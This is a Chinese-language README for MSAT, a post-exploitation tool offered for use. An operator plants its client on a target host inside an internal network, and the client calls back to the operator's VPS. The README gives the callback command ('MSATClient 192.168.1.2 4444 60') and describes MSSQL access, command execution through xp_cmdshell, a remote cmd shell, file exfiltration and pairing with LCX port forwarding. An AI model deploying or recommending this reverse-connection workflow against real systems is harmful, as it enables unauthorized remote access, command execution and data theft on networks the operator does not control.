# MSAT

MSAT是一款MSSQL反向连接可视化工具。

开发原因是遇到了较多的sql server数据库，但是大多处于内网。访问时都需要进入内网才能连接操作。在一番寻找之后没有发现合适的工具，于是本着学习.NET的打算，一通乱写，整出了这么个破玩意。勉强可以用一用。应该没有造车轮吧。由于使用到了Dev插件，导致服务端软件较大。

### 使用方法

软件分为两个部分，客户端和服务端。

##### 客户端 
.NET Framework版本： 3.5

将客户端上传到目标主机后，使用cmd打开。

```cmd
MSATClient ip port [time]
```

ip: VPS的IP地址

port：设置的VPS监听端口

time：可选参数，如果省略表示持续运行。加参数表示固定时间后自动断开socket连接，时间单位为分钟。注意：不会删除客户端持续，只是断开连接。

例：

```cmd
MSATClient 192.168.1.2 4444 60
表示连接192.168.1.2的4444端口，并且在60分钟后自动断开连接
```

##### 服务端
.NET Framework版本： 4.7.2

将压缩包解压，打开MSATServer.exe即可。

![](https://github.com/GabgM/MSAT/raw/master/image/0.PNG)

服务端有两种Socket运行方式。

①、当HOST为0.0.0.0时，监听本地端口，等待客户端反向连接。

②、当HOST不为0.0.0.0时，正向连接填写的host，搭配LCX使用，与客户端连接。

第二种连接方式存在一定的问题，只能勉强使用。

连接完成后，点击登陆按钮，连接数据库就可以正常使用了。

![](https://github.com/GabgM/MSAT/raw/master/image/1.PNG)

注意：数据库结构目前貌似只能是sa用户才能正常获取。当进行数据查询时，客户端的CPU占用会大幅度增加(25%左右)，用于对数据的处理。

当目标开启xp_cmdshell功能后，可以直接输入命令执行。

![](https://github.com/GabgM/MSAT/raw/master/image/2.PNG)

除了MSSQL的使用，还额外增加了cmd，和文件传输的功能。

下载文件，输入客户端文件的绝对路径即可。

上传文件，点击按钮选择即可。

![](https://github.com/GabgM/MSAT/raw/master/image/3.PNG)

最后，当需要退出程序时，会有两种退出方式。

![](https://github.com/GabgM/MSAT/raw/master/image/4.PNG)

点击是，会在退出服务端的同时关闭客户端。

点击否，只会退出服务端。



### 最后
本软件仅用于学习交流！
